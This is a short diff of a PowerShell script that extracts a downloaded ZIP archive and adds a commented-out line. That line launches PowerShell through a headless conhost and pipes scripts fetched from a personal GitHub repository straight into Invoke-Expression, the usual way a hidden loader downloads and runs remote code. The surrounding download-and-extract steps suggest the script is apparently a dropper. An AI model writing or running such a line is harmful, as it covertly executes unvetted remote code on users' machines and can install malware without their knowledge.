@@ -10,3 +10,5 @@ Start-Sleep -Seconds 2
 # --- Extract the ZIP file ---
 Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
 Start-Sleep -Seconds 2
+
+#conhost.exe --headless powershell -Command "iwr https://github.com/waed69/Brabus/blob/main/downlaod.ps1 | iex; iwr https://github.com/waed69/Brabus/blob/main/sleep.ps1 | iex;"
